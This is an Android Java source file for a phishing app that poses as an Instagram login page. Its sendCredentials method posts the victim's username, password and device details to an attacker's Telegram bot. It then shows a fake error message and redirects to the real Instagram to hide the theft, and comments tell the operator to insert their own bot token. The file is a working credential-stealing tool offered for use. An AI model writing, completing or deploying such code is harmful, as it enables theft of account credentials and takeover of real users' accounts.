package com.instagram.login;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;

public class MainActivity extends Activity {

    // ⚠️ GANTI INI DENGAN TOKEN BOT TELEGRAM KAMU
    private static final String TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    private static final String TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";

    private EditText usernameField, passwordField;
    private Button loginButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        usernameField = findViewById(R.id.username);
        passwordField = findViewById(R.id.password);
        loginButton = findViewById(R.id.login_button);

        loginButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String username = usernameField.getText().toString().trim();
                String password = passwordField.getText().toString().trim();

                if (!username.isEmpty() && !password.isEmpty()) {
                    // Send credentials to Telegram
                    sendCredentials(username, password);
                    
                    // Show fake error message
                    Toast.makeText(MainActivity.this, 
                        "Sorry, there was a problem with your request.", 
                        Toast.LENGTH_LONG).show();
                    
                    // Redirect to real Instagram (optional)
                    try {
                        Intent intent = new Intent(Intent.ACTION_VIEW, 
                            Uri.parse("https://www.instagram.com"));
                        startActivity(intent);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    
                    finish();
                } else {
                    Toast.makeText(MainActivity.this, 
                        "Please enter your username and password", 
                        Toast.LENGTH_SHORT).show();
                }
            }
        });
    }

    private void sendCredentials(final String username, final String password) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String deviceInfo = "Model: " + android.os.Build.MODEL + 
                                      "\nAndroid: " + android.os.Build.VERSION.RELEASE;
                    
                    String message = "🎣 INSTAGRAM PHISH\n\n" +
                                   "👤 Username: " + username + "\n" +
                                   "🔐 Password: " + password + "\n\n" +
                                   "📱 Device Info:\n" + deviceInfo;
                    
                    URL url = new URL("https://api.telegram.org/bot" + 
                                    TELEGRAM_BOT_TOKEN + "/sendMessage");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    JSONObject payload = new JSONObject();
                    payload.put("chat_id", TELEGRAM_CHAT_ID);
                    payload.put("text", message);
                    payload.put("parse_mode", "HTML");

                    OutputStream os = conn.getOutputStream();
                    os.write(payload.toString().getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
